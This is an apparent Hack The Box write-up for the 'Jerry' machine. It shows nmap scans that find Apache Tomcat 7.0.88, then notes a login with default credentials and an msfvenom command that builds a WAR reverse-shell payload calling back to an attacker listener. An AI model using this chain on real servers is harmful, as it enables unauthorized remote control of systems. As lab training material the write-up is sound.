# Jerry Writeup

Inital nmap scan... 8080 is open.
```
# Nmap 7.93 scan initiated Mon May 29 17:56:40 2023 as: nmap -Pn -n -p- -T4 -oN inital_scan 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.025s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

# Nmap done at Mon May 29 17:58:08 2023 -- 1 IP address (1 host up) scanned in 88.98 seconds
```

Apache Tomcat is running on 8080.
```
# Nmap 7.93 scan initiated Thu Jun  1 20:56:51 2023 as: nmap -Pn -n -sVC -T4 -p 8080 -oN enum_scan 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.023s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  1 20:57:04 2023 -- 1 IP address (1 host up) scanned in 13.38 seconds
```

Tomcat is installed, but not configured properly... default credentials allows you in.

File upload can be done with a .war file. Let's make a payload and run a listener.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war > shell.war
```

Open the war file to see what the file will be called.

Copy the name into the URL to 'call' the file, make sure listener is up.

Get root.


[<img height="600" width="600px" src="https://github.com/zmiddle/htb/blob/main/jerry/jerry_pwned.png" />](https://www.hackthebox.com/achievement/machine/259690/144) 
